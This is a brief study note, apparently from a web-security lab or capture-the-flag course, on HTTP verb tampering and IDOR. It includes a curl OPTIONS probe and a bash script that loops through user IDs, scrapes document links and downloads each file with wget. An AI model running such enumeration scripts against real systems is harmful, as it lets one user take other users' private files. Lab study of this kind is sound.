# <span style=color:#44D62C>HTTP Verb Tampering</span>
```bash
curl -i -X OPTIONS http://SERVER_IP:PORT/
```
* HTTP request method
    * POST,OPTIONS,HEAD,GET
* Command Injection + HTTP Verb Tampering

![image](https://hackmd.io/_uploads/S1bxv4vX0.png)

![image](https://hackmd.io/_uploads/B1DevNDQC.png)

* Insecure Configuration
* <span style=color:red>RED team hints: Try again and agin to test secure</span>
---
# <span style=color:#44D62C>IDOR</span>
## <span style=color:#53565A>eunm</span>
![image](https://hackmd.io/_uploads/HJetvvw7C.png)

* learn how to config curl options
    * -s: --silent
    * -d: --data
    * curl -s -X POST "http://83.136.253.153:51577/documents.php" -d "uid=1" | grep -oP "/documents.*?\.[a-z]{3}"
        * i.e., /documents.<u>php/report_20240520</u><span style=color:red>.txt</span>
        * i.e., /documents.<u>php/flag_123456</u><span style=color:red>.txt</span>
```bash
#!/bin/bash

url="http://$1"

for i in {1..20}; do
        for link in $(curl -s -X POST "$url/documents.php" -d "uid=$i" | grep -oP "/documents.*?\.[a-z]{3}");
        do
                wget -q $url$link
        done
done
```
* bash _script.sh STMIP:STMPO
    * 使用傳遞的參數(小技巧, 也可以直接在腳本$1裡寫位置)
* bash _script.sh 83.136.253.153:51577